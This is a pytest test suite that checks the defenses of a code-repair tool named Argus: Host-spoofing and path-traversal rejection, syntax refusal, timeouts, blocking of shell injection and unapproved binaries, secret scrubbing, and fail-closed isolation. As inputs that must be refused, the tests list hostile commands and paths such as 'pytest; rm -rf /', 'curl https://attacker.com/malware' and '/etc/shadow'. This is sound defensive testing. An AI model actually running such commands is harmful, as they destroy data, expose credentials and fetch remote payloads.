"""Adversarial Security & Robustness Test Suite for Argus.

Validates:
- CSRF & Missing Bearer Token Rejection
- DNS Rebinding / Host Header Spoofing Rejection
- Directory Traversal File Boundary Enforcement
- AST Syntax Error Refusal
- Subprocess Timeout & Process Tree Termination
"""

from __future__ import annotations

import tempfile
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from argus.api.server import create_app
from argus.patch.ast_checker import ASTChecker
from argus.patch.fuzzy_engine import PatchBlock, RefusalReason, ResilientPatchEngine
from argus.runtime.runner import SubprocessTestRunner


def test_adversarial_host_spoofing_dns_rebinding():
    """Verify that requests with spoofed Host headers are refused with HTTP 400."""
    app = create_app(workspace=".")
    client = TestClient(app)

    malicious_hosts = [
        "attacker.com",
        "evil.local",
        "192.168.1.100",
        "10.0.0.1",
        "localhost.attacker.com",
    ]

    for host in malicious_hosts:
        resp = client.get("/api/v1/health", headers={"Host": host})
        assert resp.status_code == 400, f"Expected 400 for hostile host {host}, got {resp.status_code}"
        assert "rejected" in resp.json()["detail"]


def test_adversarial_cors_null_origin_rejection():
    """Verify that requests with Origin: null do not receive CORS allow headers."""
    app = create_app(workspace=".")
    client = TestClient(app)
    resp = client.get("/api/v1/health", headers={"Origin": "null"})
    assert resp.headers.get("access-control-allow-origin") is None


def test_adversarial_path_traversal():
    """Verify that any path attempting to escape workspace root is refused with HTTP 403."""
    with tempfile.TemporaryDirectory() as tmp_root:
        root = Path(tmp_root).resolve()
        token = "sec-test-token"
        app = create_app(workspace=str(root), token=token)
        client = TestClient(app)

        traversal_paths = [
            "../../etc/passwd",
            "..\\..\\Windows\\System32\\cmd.exe",
            "src/../../../../secret.key",
            "C:\\Windows\\win.ini",
            "/etc/shadow",
        ]

        for p in traversal_paths:
            resp = client.post(
                "/api/v1/recovery/run",
                headers={"Authorization": f"Bearer {token}"},
                json={"target_file": p, "test_command": "pytest"},
            )
            assert resp.status_code == 403, f"Expected 403 Forbidden for path '{p}', got {resp.status_code}"


def test_adversarial_ast_syntax_error_refusal():
    """Verify that synthesized code with invalid Python syntax is rejected by AST checker."""
    engine = ResilientPatchEngine(enforce_ast=True)
    valid_source = "def compute(x):\n    return x + 1\n"
    
    # Patch introduces unmatched bracket / syntax error
    bad_patch = PatchBlock(
        file_path="compute.py",
        search_text="return x + 1",
        replace_text="return x + (1",  # Unclosed parenthesis
    )

    result = engine.apply_patch(valid_source, bad_patch, filename="compute.py")
    assert result.success is False
    assert result.refusal_reason == RefusalReason.REFUSED_SYNTAX_ERROR
    assert "AST syntax error" in result.details


def test_subprocess_timeout_and_termination():
    """Verify that SubprocessTestRunner terminates infinite loops cleanly on timeout."""
    runner = SubprocessTestRunner(timeout_seconds=2)
    with tempfile.TemporaryDirectory() as tmp_dir:
        # Run command that sleeps longer than timeout
        import sys
        sleep_cmd = f'"{sys.executable}" -c "import time; time.sleep(10)"'
        res = runner.run_test(sleep_cmd, cwd=Path(tmp_dir))

        assert res.timed_out is True
        assert res.passed is False
        assert "TIMEOUT" in res.traceback_summary or "exceeded limit" in res.traceback_summary


def test_test_runner_rejects_shell_chaining_and_injection():
    """Verify that commands attempting shell chaining, pipes, or command substitution are refused."""
    runner = SubprocessTestRunner(timeout_seconds=5)
    with tempfile.TemporaryDirectory() as tmp_dir:
        malicious_commands = [
            "pytest; rm -rf /",
            "pytest && echo pwned",
            "pytest || cat /etc/passwd",
            "pytest | grep secret",
            "pytest `whoami`",
            "pytest $(id)",
            "pytest > output.txt",
            "pytest < input.txt",
        ]
        for cmd in malicious_commands:
            res = runner.run_test(cmd, cwd=Path(tmp_dir))
            assert res.passed is False
            assert res.exit_code == 126
            assert "COMMAND SECURITY REFUSAL" in res.traceback_summary


def test_test_runner_rejects_unauthorized_executables():
    """Verify that arbitrary system binaries outside permitted test runners are rejected."""
    runner = SubprocessTestRunner(timeout_seconds=5)
    with tempfile.TemporaryDirectory() as tmp_dir:
        disallowed_commands = [
            "bash -c 'echo attack'",
            "sh -c 'id'",
            "cmd.exe /c dir",
            "powershell -Command Get-Process",
            "curl https://attacker.com/malware",
            "wget https://attacker.com/script.sh",
            "rm -rf *",
        ]
        for cmd in disallowed_commands:
            res = runner.run_test(cmd, cwd=Path(tmp_dir))
            assert res.passed is False
            assert res.exit_code == 126
            assert "not permitted" in res.stderr.lower()


def test_test_runner_scrubs_secrets_from_child_environment(monkeypatch):
    """Verify that sensitive environment variables (API keys, secrets, tokens) are scrubbed."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-secret-openai-key-12345")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-secret-key-67890")
    monkeypatch.setenv("GROQ_API_KEY", "gsk-prohibited-groq-key")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "super-secret-aws-token")
    monkeypatch.setenv("GITHUB_TOKEN", "ghp_supersecretgithubtoken")
    monkeypatch.setenv("SAFE_CUSTOM_FLAG", "argus_active")

    runner = SubprocessTestRunner(timeout_seconds=5)
    with tempfile.TemporaryDirectory() as tmp_dir:
        # Run a python command that checks os.environ and writes observed secrets to stdout
        probe_code = (
            "import os, sys\n"
            "keys = ['OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'GROQ_API_KEY', 'AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN']\n"
            "leaked = [k for k in keys if k in os.environ]\n"
            "if leaked:\n"
            "    sys.exit(42)\n"
            "if os.environ.get('SAFE_CUSTOM_FLAG') != 'argus_active':\n"
            "    sys.exit(43)\n"
            "sys.exit(0)\n"
        )
        import sys
        probe_cmd = f'"{sys.executable}" -c "{probe_code}"'
        res = runner.run_test(probe_cmd, cwd=Path(tmp_dir))
        assert res.passed is True
        assert res.exit_code == 0


def test_test_runner_fails_closed_when_container_isolation_unavailable(monkeypatch):
    """Verify that untrusted code fails closed when container isolation is required but unavailable."""
    from argus.runtime import runner as runner_mod

    # Force container availability check to return False
    monkeypatch.setattr(runner_mod, "is_container_available", lambda: False)

    runner = SubprocessTestRunner(isolation_mode="container")
    with tempfile.TemporaryDirectory() as tmp_dir:
        res = runner.run_test("pytest", cwd=Path(tmp_dir))
        assert res.passed is False
        assert res.exit_code == 125
        assert "ISOLATION REFUSAL" in res.traceback_summary
        assert "container isolation is required" in res.stderr

